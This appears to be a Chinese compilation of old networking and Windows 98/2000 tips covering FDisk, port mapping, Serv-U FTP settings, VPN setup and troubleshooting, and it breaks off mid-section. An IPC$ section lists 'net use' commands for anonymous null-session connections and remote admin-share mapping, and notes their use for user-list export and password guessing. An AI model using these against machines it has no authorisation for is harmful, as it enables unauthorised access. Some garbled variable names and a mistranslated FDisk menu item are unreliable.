  Ping 不通则说明网络线路出现故障，如网络中还有路由器，则应先Ping路由器在本网段端口的IP地址，不通则此段线路有问题，通则再Ping路由器在目标计算机所在网段的端口IP地址，不通则路由出现故障，通再Ping目的机的IP地址。 
4.Ping网址 
  若要检测一下一个带DNS服务的网络（如Internet），在上一步Ping通了目标计算机的IP后，仍然无法连接到该机，则可以Ping机的网络名，正常情况下会出现该网址所指向的IP地址，这表明本机的DNS设置正确而且DNS服务器工作正常，反之就可能是其中之一出现了故障；同样也可以通过Ping计算机名检测WINS解析的故障（WINS是将计算机名解析到IP地址的服务。）。
实战Fdisk
启动FDisk 
　　在启动盘根目录（如A：＼）下键入FDisk，按回车键确认后，系统会询问是采用FAT16还是FAT32分区格式？由于FAT32拥有更好的磁盘空间利用率等优点，且Windows 95 OS2版本后的Windows操作系统都支持FAT32，因此建议大家采用FAT32分区格式。 
　　按“Y”键进入FDisk后。会出现如下界面（如表1）： 
表1 fdisk的主界面
microsoft window 98fixed disk setup program(c) 
copyright microsoft corp. 1983-1998fdisk options
版权信息
current fixed disk drive：1
检测到一个硬盘：1
choose one of the following:
在下面的内容中选择其一
1.create dos partition or logical dos drive
1.建立主分区或逻辑分区
2.set active partition
2.设置活动分区
3.delete partition or logical dos drive
3.删除主分区或逻辑驱动器(区)
4.display partition information
4.显示分区信息
enter choice [1]
当前选项[1]
　　查看分区信息 
　　选择表1中的“4.Display Partition Information”，查看现有的分区状况，如出现下表内容（如表2），则至“删除分区”。如无分区信息显示，则跳至“创建分区”。 
表2 显示现有的分区状况
display partition information
current fixed disk drive：1
partition
status
type
volume label
mybytes
system
usage
c:1 
2
a
pri dos 
ext dos
5005 
14614
unknow
26% 
74%
total disk space is 19618 mbytes(1mbyte=1048576 bytes)
the extended dos partition contains logial dos drive. 
do you want to display the logial dos drive information（y/n）…[y] 
逻辑驱动器包含在扩展分区中。 
你要查看逻辑驱动器的信息吗？（是/不）……［是］
　　删除分区 
　　选择表1中的“3、Delete Partition Or Logial Dos Drive”，出现下表（如表3）： 
表3 删除分区的主界面
choose one of the following:
在下面的内容中选择其一
1.delete primary dos partition
1.删除主分区
2.delete extended dos partition
2.选择扩展分区
3.delete logical dos drive in the extended dos partition
3.删除逻辑驱动器(区)
4.delete non-dos partition
4.设置活动分区
enter choice [1]
当前选项[1]
　　建议以“逻辑驱动器→扩展分区→主分区”的顺序将各分区（驱动器）删除，删除后硬盘上的内容将全部丢失。 
　　创建分区 
　　选择表1中的“1.Create Dos Partition Or Logical Dos Drive”会出现下面的内容（如表4）： 
表4 创建分区的主界面
current fixed disk drive：1
检测到一个硬盘：1
choose one of the following:
在下面的内容中选择其一
1.create primary dos partition
1.创建主分区
2. create extended dos partition
2.创建扩展分区
3. create logical dos drive in the extended dos partition
3.创建逻辑驱动器（区）
enter choice [1]
当前选项[1]
　　选择“1.Create Primary Dos Partition”，随后FDisk会询问“你希望用最大容量创建一个主分区且把它激活吗？” 
　　如果想将所有的硬盘空间划分为一个区，则按键盘上的“Y”键，否则至“创建主分区”。 
　　创建主分区 
　　如果不止创建一个分区，这时则按“N”键。会得到如下提示（如表5）： 
　　Total Disk Space Is 19618 Mbytes(1Mbyte=1048576 Bytes)Maximum Space Avaible For Partition Size In Mbytes Or Percent Of Disk Space(%)To Create A Primary Dos Partition 
　　总计磁盘空间为19618MB，创建主分区要输入数量或百分比（注：这个括号内的数字是硬盘的整个空间，这时你可以根据需要输入一个具体的数字或百分比，百分比是对整个硬盘而言的）。 
　　表5 提示输入主分区的容量或百分比 
　　输入具体的数字或百分比后，按回车键即创建了主分区，这时FDisk会提示：“Primary Dos Partition Created（主分区创建完毕）”，接着按“Esc”键返上级菜单。 
　　创建扩展分区 
　　选择“2. Create Extended Dos Partition”，创建扩展分区，提示如下（如表6）： 
　　Total Disk Space Is 19618　Mbytes(1mbyte=1048576bytes)Maximum Space Available For Partition Is 15608 Mbytes (80%) Enter Partition Size In Mbyte Or Percent Of Disk Spack(%)To Create An Extended Dos Partition ... 
　　在19618MB的磁盘空间中，有15608MB（80%）可用作创建扩展分区 
　　表6 创建扩展分区 
　　直接按回车键即可把剩余空间划分为扩展分区，随后得到如下提示：“Extended Dos Partition Created（扩展分区创建完成）。” 
　　创建逻辑驱动器 
　　按“Esc”继续出现如下提示（如表7）： 
　　Total Extended Dos Partition Size Is 15608 Mbytes(1mbyte=1048576bytes)Maximum Space Available For Logical Drive Is 15608 Mbytes(100%). 
　　Enter Logical Drive Size In Mbytes Or Percent Of Disk Space( %). 
　　总计扩展分区的空间为15608MB，有效逻辑驱动器空间15608MB。键入逻辑驱动器的所占空间的大小（百分比）。 
　　表7 创建逻辑驱动器 
　　此时如果只想给硬盘分两个区，即C、D两个区，则把全部空间划分为一个逻辑驱动器。如想划分多个分区，则根据需要进行调整。比如想赋予D区7000MB的空间，E区剩余空间。就在上面的提示中输入7000，在创建好D区后，系统会提示输入下一个逻辑驱动器的空间，此时将剩余空间全部输入即可。 
　　激活分区 
　　分区的空间调整好了，最后我们还需要将主分区激活，方法是选择表1中的“2.Set Active Partition”一项，接着会出现下面的内容（如表8）。 
表8 激活主分区
set active partition
current fixed disk drive：1
partition
status
type
volume label
mybytes
system
usage
c:1 
2 
pri dos 
ext dos
5005 
14614
unknow
26% 
74%
total disk space is 19618 mbytes(1mbyte=1048576 bytes)
enter the number of the partition you want to make active...：（1）你需要激活哪个分区?
　　此时选择“1”将主分区激活，随后提示： 
　　You Must Restart Your System For Your Changed To Take Effect，Any Drives You Have Created Or Changed Must Be formatted After You Restart Shut Down Windows Before Restarting.Press Esc To Exit FDisk. 
　　你必须重新启动系统才能完成分区工作，在使用这些分区前你需要对它们进行格式化。按Esc键退出FDisk。 
　　按下“Ctrl+Alt+Del”键重新启动计算机，分区工作全部完成。 
端口映射的几种实现方法
采用端口映射（Port Mapping）的方法，可以实现从Internet到局域网内部机器的特定端口服务的访问。笔者总结了在教学与组网实践中采用的几种端口映射方法，在此与大家交流探讨。
　　利用IIS实现WWW和FTP服务的重定向 
　　Windows 2000和Windows XP都包含了IIS组件，其中的WWW和FTP服务具有主目录重定向设置，与端口映射相比，虽名称不同但作用类似。本文以Windows 2000下IIS 5.0的WWW和FTP服务举例说明。 
　　1、WWW服务的重定向 
　　打开管理工具中的Internet服务管理器，进入“Internet信息服务”对话框，选择Web站点名称，例如：“默认Web站点”，查看其属性，在属性页面的“主目录”标签下，我们可以设置WWW服务器的主目录位置。设定主目录为“另一计算机上的共享位置”，则可以在“网络目录”栏目内，以“\\{服务器}\{共享名}”格式填写局域网内部的WWW服务器上已经设为共享的主目录，例如：\\Server6\www。 
　　我们也可以选择“重定向到URL”，然后在“重定向到”栏目输入局域网内部的WWW服务器的链接，例如http://192.168.0.6。
2、FTP服务的重定向 
　　与WWW服务的重定向相似，打开管理工具中的Internet服务管理器，进入“Internet信息服务”对话框，选择FTP站点名称，例如：“默认FTP站点”，查看其属性，在属性页面的“主目录”标签下，我们可以设置FTP服务器的主目录位置。 
　　WinRoute Pro的端口映射功能 
　　WinRoute Pro是一个工作于NAT（网络地址翻译）方式的Internet共享软件。它本身自带了端口映射功能。 
　　运行WinRoute Administration并登录，在主菜单上选择“Settings→ Advanced→Port Mapping”，出现端口映射的设置界面。端口映射条目的添加、编辑界面如图所示。可以设置的选项包括协议、监听端口、端口类型（单一端口还是某个范围的连续端口）、目的主机、目的端口等。 
　　专用的端口映射工具PortTunnel 
　　PortTunnel是一个实现端口映射的专用工具。它是一个直接运行的软件。 
如果操作系统为Windows NT/Windows 2000/Windows XP，第一次运行时选择Start，PortTunnel会自动以服务方式运行。点击[Add]按钮添加条目，点击[Edit]按钮编辑现有条目，点击[Delete]按钮删除条目。“新建/编辑”条目的界面见下图。 
　　 　　在这个“新建/编辑端口映射”对话框中，我们要给该条目命名，然后设定输入端口（Port In）、绑定地址（Bind address）、输出端口（Port Out）和输出地址（Address Out）。其中，“绑定地址”是指监听该主机的哪一个IP（内部IP还是外部IP）。设为“Any(0.0.0.0)”则监听该主机的全部IP。 
　　PortTunnel专门针对HTTP、FTP、SMTP服务的端口映射，提供了较多的参数设置，在相应的标签菜单下调整。此外，PortTunnel还提供了安全性设置和日志、统计等功能。
server -u的使用
------------- server -u的使用----------------- 
server是serv-U可以管理的本地或远程服务器.它包括: 
? name:用以描述标志这一服务器,可以是任意名称,如'<>',与DNS名称无关; 
? FTP server IP address or nameP地址或DNS名称,如'127.0.0.1','ftp.aboutnt.com'等; 
? user name:具有管理权限的用户名; 
? Password:口令 
? Administration port:管理端口,serv-u管理程序通过该端口对远程FTP服务器进行管理.对于'<< Local Server >>' 这个值是随机自动配置的,如43958等,本端口只能在本地使用,远程管理程序不能够通过这个端口对'<< Local Server >>'进行管理.要管理远程FTP服务器,通常使用缺省的FTP端口即21. 
? Start Automatically (system service): 
这个选项只存在于本地服务器. 
? Start/Stop Server: 
启动/停止服务器,对于远程服务器,只出现停止按钮. 
General 
? Max. speed 
可以使用的最大带宽（KB/S），如果不填写将使用所有可用带宽。如果不填数值，Serv-u将使用所有可用的带宽，会导致其它的网络应用不可用，不建议。 
? Max. no. of users 
可以同时连入的最大用户数，设置为0将不允许用户连入，不填写将不限制同时连入的用户数目。 
? Check anonymous passwords 
检查匿名用户的口令。实际上只是检查匿名用户的口令象不象一个电子邮件地址，而不会验证这个电子邮件是否真正存在。 
? Delete partially uploaded files 
删除不完整的上载文件。如果选择此项，系统会自动删除没有完全上载的文件；如果不选项此项，则FTP服务器就具备的断点续传的功能。 
? Block anti time-out schemes 
防止反超时设置。一些FTP客户端程序为了防止用户长时间不操作而导致的超时断开,会自动的向服务器端发送一些命令。如果选择了这一项，服务器将采用一种独特的记时方式以防止客户程序的这时反超时设置。 
? Block FTP_bounce attacks 
防止跨FTP攻击，选择此项将只允许客户端与服务器之间进行文件传输，不允许任何服务器与服务器间的文件传输（FXP）。 
? Block users who connect more than XX times within YY seconds for ZZ minutes 
使用这一项可以防止用户使用如网络蚂蚁等高速下载软件连接你的服务器。如何他们在YY秒内建立的并发连接数超过XX个，系统会立即终止超出的连接。这一项可以大大降低服务器的开销。 
? Use all lower case for files/dirs 
文件与目录的小写敏感设置。 
Dir Cache 
对服务器来说，创建一个目录列表是一个比较慢的操作。Dir Cache允许配置是否缓存用户请求的目录列表，这会大大提高系统的性能。 
? Enable cache 
选择此项将启动Cache功能。 
? Maximum size 
Cache的最大容量。在95/NT下，缺省被设置为25。当缓存被填满后用户请求新文件时，服务器会进行过期操作，用新条目代缓存中最旧的条目。 
? Time-out 
超时设置。目录列表在缓存中保留的时间。以秒为单位，缺省为600。 
? Auto refresh 
自动更新缓存列表信息。 
? Cache List 
所有被缓存的目录列表。 
Advanced 
在这个标签下面的设置对系统的性能与安全都非常重要，因此要小心设置，通常缺省的设置即可满足大多数服务器的需要。 
? Encrypt passwords 
使Serv-U使用单向hash函数(MD5)加密用户口令，加密后的口令保存在ServUDaemon.ini或是注册表中。如果不选择此项，用户口令将以明文形式保存在文件中。改变这一选项将导致所有现存的口令失效，必须重新进行设置。 
? Enable security 
选择此项将启动服务器安全，否则服务器将无任何安全可言。强烈建议启用。 
? Packet time-out (seconds) 
数据包超时设置。 
? Dir listing mask 
目录列表掩码 
? PASV port range 
不填写表示端口范围从1024到65535.如果服务器位于防火墙后，建议设置范围。 
Serv-U3.0的Domain设置 
一个Serv-U的单一实例可以用来建立多个虚拟FTP服务器，每个FTP服务器在管理程序中称之为一个域(Domain)。因此要使FTP服务器可用最少需要创建一个域。每一个域都有用户、组和设置与之相关联，一个域至少有一个用户才有意义。在你第一次启动Administrator管理程序时，通常向导会引导你初始化一个域并创建一个用户。通常的层次结构如下： 
Serv-U Server 
? Domain 1 
o User account 1 
o User account 2 
o User account 3 
? Domain 2 
o User account 1 
o User account 2 
? Domain 3 
o User account 1 
o User account 2 
每一个域包括： 
? name:该域的描述名称，用来标识该域，与DNS名称无关。 
? Domain ip address:该域所使用的IP地址，可以使用某个地址如10.10.10.10,也可以使用“Use any available IP address”选项使用多个地址。如果FTP服务器的地址是动态分配的，那么此处可以不填。 
在同一FTP服务器上的每一个域的IP与端口组合是唯一的。也就是说不能够创建多个虚拟FTP服务器，它们共享相同的IP/端口，这与IIS的虚拟主机不同。 
? Domain type:有两种：store in .ini file和store in computer registry。也就是将域配置信息放置在ServUDaemon.ini文件中还是注册表中。对于小于500个用户的小型站点来说，建议将配置信息放在ServUDaemon.ini文件中，超过这个用户数目可以考虑使用注册表类型的域。因为95/98/me.ini类型的文本文件有64K的限制，nt/2000虽然没有这方面的限制，但当文本文件太大时，操作会比较慢。 
注册表位置是：HKEY_LOCAL_MACHINESoftwareCat SoftServ-UDomains 
? Ftp port number:域要监听的Ftp端口，通常为21. 
General 
? Max no. of users 
同时连入域的最大用户数。不填为不限制。 
? Virtual path mappings 
虚拟路径映射允许你将映射物理路径到本地或网络的其它目录中去。使用它你可以创建与你的物理目录完全不同的虚拟路径。如果用户被锁定在主目录下，这项功能将允许他们访问主目录之外的其他目录。 
虚拟路径包括： 
Physical path:真实路径。可以使用常规文件路径或者是UNC路径或者是网络驱动器。 
Mapped to:映射到哪一处目录下。可以使用如下的变量： 
%HOME% - 代替用户的主目录 
%USER% - 代替用户的账户名 
Virtual name:最终通过FTP客户端显示给用户的路径名。 
上述概念比较难以理解，现举例说明： 
假设你将aboutnt用户的主目录设置为d:aboutnt并将用户限制于该目录下，那么用户将只能够访问d:aboutnt下的目录和文件，如果用户这时想访问c:data下的数据就需要虚拟路径的帮助。可以这样设置：在虚拟路径对话框下单击添加，物理路径填写：c:data，映射到填写：%home%或d:aboutnt，虚拟路径名称填写data，也就是将c:data物理目录映射到了用户的主目录下，文件夹的名称为data。当用户通过FTP客户端连入服务器时，会在其主文件夹下出现一个名为data的子文件夹，而实际上这个文件夹并不物理的位于主目录下。 
请注意，虚拟路径映射设置完毕后并不会立即生效，它需要用户对该物理目录进行目录访问规则设置，使该目录允许用户访问才行。 
? Links 
关于Unix的一些设置。 
IP Access 
允许你设置基于IP地址的访问限制。按照预先制定的规则，客户IP地址可以被允许或拒绝访问FTP服务器。该限制可以基于IP地址也可以基于DNS名称。 
? Edit Rule 
编辑规则。首先要指定是允许访问规则还是拒绝访问规则，其次指定IP地址信息。地址信息中可以使用“*”、“-”和“？”通配符。 
? Rule List 
规则列表。缺省情况下，没有IP地址规则存在，允许所有IP地址访问FTP服务器。一旦规则建立，登入的用户在允许访问之前必须通过规则检查。 
? 注意：规则的顺序是非常重要的。系统会按从上到下的顺序匹配规则，当找到第一条匹配的规则时会应用并停止向下进行匹配查找。如有如下的规则： 
Deny: *.*.*.* 
Allow: 202.202.*.* 
上面的规则会拒绝任何地址的访问，因为第一条规则会匹配所有的IP地址。用户的原意可能是只允许以202.202开头的IP地址访问，那么进行如下调整就可达到目的： 
Allow: 202.202.*.* 
Deny: *.*.*.* 
Message 
FTP提供了详细的消息设置，这些消息都可以望文知义，因此不再做详细的介绍。消息中可以使用变量，这些变量主要应用于： 
? 登录/登出消息 
? 指定的用户登录消息 
? 目录改变消息 
(1)Time/date 
? %Time - 你的PC上的当前时间 
? 趖e - 你的PC上的当前日期 
(2)Server statistics 
? %ServerDays - 服务器已经运行的天数 
? %ServerHours - 服务器已经运行的小时数 
? %ServerMins - 服务器已经运行的分钟数 
? %ServerSecs - 服务器已经运行的的秒数 
? %ServerKbUp - 自服务器运行以来上载的文件总量（KB） 
? %ServerKbDown - 自服务器运行以来下载的文件总量（KB） 
? %ServerFilesUp - 自服务器运行以来上载的文件数目 
? %ServerFilesDown - 自服务器运行以来上载的文件数目 
? %LoggedInAll - 自服务器运行以来用户的总登录数 
? %ServerAvg - 自服务器运行以来的平均吞吐量 
? %ServerKBps - 当前服务器的带宽 
(3)Server settings 
? %MaxUsers - 允许的最大用户数目 
? %MaxAnonymous - 允许的最大匿名用户数目 
4)User info 
? %Name - 用户登录名 
? %IP - 用户IP地址 
? %Dir - 用户当前目录 
? %Disk - 用户当前磁盘驱动器 
? 遰ee - 用户当前剩余空间（KB） 
? %FUp - 用户上载文件总数 
? 齩wn - 用户下载文件总数 
? %FTot - 传输文件总数 
? %BUp - 用户上载文件总量（KB） 
? 給wn - 用户下载文件总量（KB） 
? %BTot - 传输文件总量 
? %TconM - 总连接时间（分钟） 
? %TconS - 总连接时间（秒） 
? %RatioUp - UL/DL的上载部分 
? %RatioDown - UL/DL的下载部分 
? %RatioCredit - 当前UL/DL中的下载信用(Kb或文件数目) 
? %QuotaUsed - 用户所用空间配额（KB） 
? %QuotaLeft - 用户剩余空间配额（Kb） 
? %QuotaMax - 最大可用磁盘空间（KB） 
(5)Number of users 
? %UNow - 当前连接到FTP服务器的用户数目 
? %UAll - 自服务器启动后连接上的用户数目 
? %U24h - 最后24小时连入的用户数目 
? %UAnonAll - 当前连入的匿名用户数目 
? %UAnonThisIP - 使用此IP连入的匿名用户数目 
? %UNonAnonAll - 当前连入的非匿名用户数目 
? %UNonAnonThisIP - 使用此IP连入的非匿名用户数目 
? %UThisName - 使用当前用户名连入的用户数目 
Logging 
允许你配置LOG选项。可以将信息显示在屏幕上也可以将信息保存在文件中。 
UL/DL Ratios 
指定不记入UL/DL Ratios中的文件。有如下四种情况： 
? 文件名不包含路径：表示在任何目录下名称为指定文件名的文件都是“免费”的，如“index.txt” 
? 文件名包含路径但包含驱动器名:表示在任何驱动器中的指定文件夹中的该文件都是“免费”的，如 ''homesmisc eadme.txt'' 表示类似“c:homesmisc eadme.txt”文件是免费的，“d:homesmisc eadme.txt”. 
? 文件名包括完整的驱动器符和路径：表示只有指定的该文件是“免费”的。 
? 文件名支持通配符“*”和“？”。 
Advanced 
? Allow MDTM command to change file date/time 
? Block future dates/times 
上述两项主要是针对特定的FTP客户端。 
? Allow passive mode data transfers 
允许进行passive模式数据传输。 
? Use IP 
进行passive数据所用的外部IP地址 
Serv-U3.0的User和Group设置 
用户设置 
Account 
? Disable account 
禁止用户账号。 
? Automatically remove account on date 
自动在指定的时间删除用户账号。 
? User Name 
用户名，可以对用户名进行修改。“Anonymous”用户名为匿名用户专用，它不需要口令，它以登入的用户提供的E-mail地址作为口令。 
? Group(s) 
任何用户都可以属于一个或多个组。组可以简化对用户的管理。 
? Password 
用户的口令。 
? Home Directory 
主目录，用户登录后将直接进入该目录下。每个用户必须有一个主目录，主目录必须使用完整的路径，包括磁盘驱动器或UNC共享名称。 
? Lock user in home directory 
选择此项用户将被锁定在自己的主目录下，为安全起见建议选择此项。 
? Privilege 
用户特权，有四种 
No Privilege 
该用户不能够进行远程管理，一般用户应该选择此项。 
Group Administrator 
账户可以进行远程管理，但只能对本组用户进行管理，不能对服务器进行管理。 
Domain Administrator 
账户可以进行远程管理，但只能对本域进行管理，不能添加新域。 
System Administrator 
账户可以进行远程管理且具有全部权限。 
Read-only Administrator 
此账户用来进行远程诊断，可以看到全部的服务器设置但不能够进行修改。 
Notes 
对该账号的说明，随便写。 
General 
? Hide ''hidden'' files 
隐藏具有隐藏属性的文件。 
? Allow only X login(s) from the same IP address 
防止用户从一个IP多次登录。一个FTP客户端会为不同的文件传输建立不同的登录会话。 
? Allow user to change password 
允许用户改变密码，部分FTP客户端支持。 
? Max. upload and download speed 
最大的上载和下载速度。 
? Idle time-out 
空闲超时。 
? Session time-out 
会话超时。 
? Max. no. of users 
用户使用同一用户名可以同时连入服务器的最大数。 
? Login message file 
登录消息文件。 
? Password type 
口令类型。通常为''Regular Password''。 
Dir Access 
文件 
? Read access：允许用户从服务器下载文件； 
? Write access,：允许用户上载文件到服务器，但不允许修改、删除和重命名； 
? Append access：允许向存在的文件附加内容或者进行续传； 
? Delete access：允许用户修改文件、重命名和删除； 
? Execute access：通常FTP执行命令，这个权限要小心使用，可能导致安全问题。 
目录 
? List access：允许用户取得该目录下的文件列表； 
? Create access：允许用户在该目录下创建新的子目录； 
? Remove：允许用户删除目录。 allows the user to delete directories. 
子目录 
? Inherit：父目录的访问规则自动应用到子目录上。 
IP Address 
(与域设置相同，略) 
UL/DL Ratios 
用户上传下载文件的一种信用机制 
? Enable UL/DL ratios 
启用/关闭UL/DL比率 
? Count files per session 
计算每会话的文件数 
? Count bytes per session 
计算每会话的文件大小 
? Count files over all sessions 
计算所有会话的文件数 
? Count bytes over all sessions 
计算所有会话的文件大小 
? Uploads 
上载数 
? Downloads 
下载数 
? Preset/Current 
Quota 
你可以限制用户或组能够使用的最大磁盘空间。 
? Enable disk quota 
启用/关闭磁盘配额。 
? Current X Kb 
当前空间使用情况。 
? Maximum X Kb 
用户所能够使用的最大磁盘空间。 
? Calculate current 
计算当前用户占用的磁盘空间。 
什么是ipc$
建立空连接:
net use \\IP\ipc$ "" /user:"" 
非空连接
net use \\IP\ipc$ "用户名" /user:"密码"
删除一个ipc$连接
net use \\IP\ipc$ /del 
删除共享映射
net use c: /del 
net use * /del 
映射默认共享:
net use z: \\IP\c$ "密码" /user:"用户名"
ipc$就是管理共享。
也就是2K默认的共享。 
什么是ipc$ 
IPC$(Internet Process Connection)是共享"命名管道"的资源(大家都是这么说的)，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。 
利用IPC$,连接者甚至可以与目标主机建立一个空的连接而无需用户名与密码(当然,对方机器必须开了ipc$共享,否则你是连接不上的)，而利用这个空的连接，连接者还可以得到目标主机上的用户列表(不过负责的管理员会禁止导出用户列表的)。 
我们总在说ipc$漏洞ipc$漏洞,其实,ipc$并不是真正意义上的漏洞,它是为了方便管理员的远程管理而开放的远程网络登陆功能,而且还打开了默认共享,即所有的逻辑盘(c$,d$,e$……)和系统目录winnt或windows(admin$)。 
所有的这些,初衷都是为了方便管理员的管理,但好的初衷并不一定有好的收效,一些别有用心者(到底是什么用心?我也不知道,代词一个)会利用IPC$，访问共享资源,导出用户列表,并使用一些字典工具，进行密码探测,寄希望于获得更高的权限,从而达到不可告人的目的. 
解惑: 
1)IPC连接是Windows NT及以上系统中特有的远程网络登陆功能，其功能相当于Unix中的Telnet,由于IPC$功能需要用到Windows NT中的很多DLL函数，所以不能在Windows 9.x中运行。 
也就是说只有nt/2000/xp才可以建立ipc$连接,98/me是不能建立ipc$连接的(但有些朋友说在98下能建立空的连接,不知道是真是假,不过现在都2003年了,建议98的同志换一下系统吧,98不爽的) 
2)即使是空连接也不是100%都能建立成功,如果对方关闭了ipc$共享,你仍然无法建立连接 
3)并不是说建立了ipc$连接就可以查看对方的用户列表,因为管理员可以禁止导出用户列表 
ipc$  可以删除阿！ 
net use \\IP\ipc$ /del 
这个就是删除命令
VPN网络组建（附图）
VPN网络组建 
1．关于VPN
虚拟专用网络（Virtual Private Network，VPN）是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过VPN可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。
南山如果说得再通俗一点，VPN实际上是"线路中的线路"，类型于城市大道上的"公交专用线"，所不同的是，由VPN组成的"线路"并不是物理存在的，而是通过技术手段模拟出来，即是"虚拟"的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用"通道"，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。
南山本节的VPN服务器端使用Win2K；客户机端使用Win98。 
2．配置VPN服务器 
（1）尚未配置：Win2K中的VPN包含在"路由和远程访问服务"中。当你的Win2K服务器安装好之后，它也就随之自动存在了！不过此时当你打开"管理工具"中的"路由和远程访问"项进入其主窗口后，在左边的"树"栏中选中"服务器准状态"，即可从右边看到其"状态"正处于"已停止（未配置）"的情况下。
南山（2）开始配置：要想让Win2K计算机能接受客户机的VPN拨入，必须对VPN服务器进行配置。在左边窗口中选中"SERVER"（服务器名），在其上单击右键，选"配置并启用路由和远程访问"。

（3）如果以前已经配置过这台服务器，现在需要重新开始，则在 "SERVER"（服务器名）上单击右键，选"禁用路由和远程访问"，即可停止此服务，以便重新配置！ 
（4）当进入配置向导之后，在"公共设置"中，点选中"虚拟专用网络（VPN）服务器"，以便让用户能通过公共网络（比如Internet）来访问此服务器。 
（5）在"远程客户协议"的对话框中，一般来说，这里面至少应该已经有了TCP/IP协议，则只需直接点选"是，所有可用的协议都在列表上"再"下一步"即可。 
（6）之后系统会要求你再选择一个此服务器所使用的Internet连接，在其下的列表中选择所用的连接方式（比如已建立好的拨号连接或通过指定的网卡进行连接等）再"下一步"。 
（7）接着在回答"您想如何对远程客户机分配IP地址"的询问时，除非你已在服务器端安装好了DHCP服务器，否则请在此处选"来自一个指定的IP地址范围"（推荐）。 
（8）然后再根据提示输入你要分配给客户端使用的起始IP地址，"添加"进列表中，比如此处为"192.168.0.80~192.168.0.90"。（请注意，此IP地址范围要同服务器本身的IP地址处在同一个网段中，即前面的"192.168.0"部分一定要相同！） 
（9）最后再选"不，我现在不想设置此服务器使用RADIUS"即可完成最后的设置。此时屏幕上将自动出现一个正在开户"路由和远程访问服务"的小窗口，当它消失之后，打开"管理工具"中的"服务"，即可以看到"Routing and Remote Access"（路由和远程访问）项"自动"处于"已启动"状态了！ 

3．赋予用户拨入的权限 
（1）默认的，任何用户均被拒绝拨入到服务器上。 
（2）欲给一个用户赋予拨入到此服务器的权限，需打开管理工具中的用户管理器（在"计算机管理"项或"Active Directory用户和计算机"中），选中所需要的用户，在其上单击右键，选"属性"。
（3）在该用户属性窗口中选"拨入"项，然后点击"允许访问"项，再"确定"即可完成赋予此用户拨入权限的工作。 
4．通过局域网来进行的VPN连接 
（1）进入Win98的计算机，它要想连接到VPN服务器，则需要先安装"虚拟专用网络"服务。在控制面板的"网络"下，进入"通讯"即可找到此项并添加上去；安装完成之后再根据提示重启动计算机。 
（2）重新启动之后，在控制面板的"网络"中就有了"Microsoft 虚拟私人网络适配器"，即说明VPN服务已安装成功！


（3）还需要建立到VPN服务器的连接。首先进入我的电脑的"拨号网络"中，双击"建立新连接"，然后在"请键入对方计算机的名称"输入连接名，比如为"局域网内的VPN连接"，在"选择设备"下一定不要忘了选中"Microsoft VPN Adapter"项！再"下一步"。


（4）接着出现"请输入VPN服务器的名称或IP地址"，在其下的文字框中输入Win2K服务器的名字或IP地址，比如此处为"192.168.0.1"，再根据提示操作即可建立成功！ 

（5）然后在"拨号网络"中双击刚才建立好的"局域网内的VPN连接"图标，再输入相应的用户名（需具有拨入服务器的权限）和密码，再按"连接"按钮。

（6）如果成功连接到了VPN服务器，此时就会像普通拨号上网成功一样，在任务栏右下角会出现两个小电脑的图标，双击它即可出现连接状态小窗口。 
5．通过Internet来进行的VPN连接 
（1）首先得确保服务器已经连入了Internet，用ipconfg测出其在Internet上合法的IP地址。 
（2）在Win98客户机端参照本节上文相关内容建立一个新的VPN连接，在相应处输入服务器在Internet上的合法的IP地址；然后将客户机端也拨入Internet，再双击所建立的VPN连接，输入相应用用户名和密码再点"连接"按钮。 
（3）连接成功之后可以看到，双方的任务栏右侧均会出现两个拨号网络成功运行的图标，其中一个是到Intenet的连接，另一个则是VPN的连接了！ 

（4）当双方建立好了通过Internet的VPN连接后，即相当于又在Internet上建立好了一个双方专用的虚拟通道，而通过此通道，双方可以在网上邻居中进行互访，也就是说相当于又组成了一个局域网络！这个网络是双方专用的，而且具体良好的保密性能。 
6．VPN建立成功之后，双方便可以通过IP地址或"网上邻居"来达到互访的目的，当然也就可以使用对方所共享出来的软硬件资源了！
Win 98常见故障手到“病”除
从Windows诞生的那天起，蓝屏、黑屏、非法操作等故障就时时伴随着我们，我们也想尽了各种办法解决这些故障。本期龙龙就和大家一起把这些故障来一次全面的回顾总结，再遇到这些故障时做到心中有数，手到“病”除。 
显示蓝天白云图的时间太长 
故障现象： 
启动计算机时，Windows系统会显示蓝天白云图，其显示时间一般在半分钟左右。但有些朋友的计算机用于显示蓝天白云图的时间往往长达两三分钟。 
故障分析： 
显示蓝天白云图时，系统主要是在执行Config.sys、Autoexec.bat以及Win.ini、System.ini和注册表中的启动选项，若上述文件中的自启动选项太多，就会极大地影响系统的启动速度。另外磁盘出现坏道及系统中存在病毒也会影响系统的启动速度。 
解决方法:
首先检查Autoexec.bat文件，看其中有没有比较耗时的DOS程序命令行，若有，可根据自己的需要进行取舍，然后再查看Win.ini、System.ini和注册表中的启动选项。如果这些文件中的启动选项都被取消后，蓝天白云显示的时间仍然很长，就应该怀疑系统被病毒感染了。若病毒原因也被排除，就应该考虑是磁盘故障了。首先对磁盘进行全面扫描，检查硬盘是否存在坏道，然后运行磁盘碎片整理程序，最后运行磁盘清理程序，清除计算机中的垃圾文件。经过上述操作后，系统的启动速度将会大幅度提升。 
系统的快速启动工具栏不见了 
故障现象： 
Windows 98提供了一个由“IE”、“OE”和“显示桌面”等图标按钮组成的快速启动工具栏，有一天进入系统后，发现该快速启动工具条不见了。 
故障分析： 
该故障是用户无意中关闭了Windows 98的快速启动工具栏造成的，我们只需重新将其打开即可。另外，用户将快速启动工具栏拖到桌面上也会造成它的“失踪”。 
解决方法：


右击Windows 98任务栏，选择弹出菜单的“工具栏”子菜单中的“快速启动”命令(如图1)，快速启动工具栏就会重新出现在任务栏上。对于将快速启动工具栏拖到桌面上的情况，我们只需将它重新拖拽到任务栏中即可。 
系统总是首先打开汉字输入法 
故障现象： 
启动中文Windows 9x后，系统托盘中的输入法图标不是常见的图标，而是某种汉字输入法图标。 
故障分析： 
这是用户将某种中文输入法错误地设置成了默认输入法所致，我们只需将系统默认输入法还原为英文输入法即可解决问题。 
解决方法： 
右击系统托盘中的“输入法”图标，选择弹出菜单中的“属性”命令，选择“键盘属性”设置框中的“语言”选项卡，然后在“语言”列表框中选择“En英语”输入法并单击“设成默认值”即可。 
无法安装GBK输入法 
故障现象： 
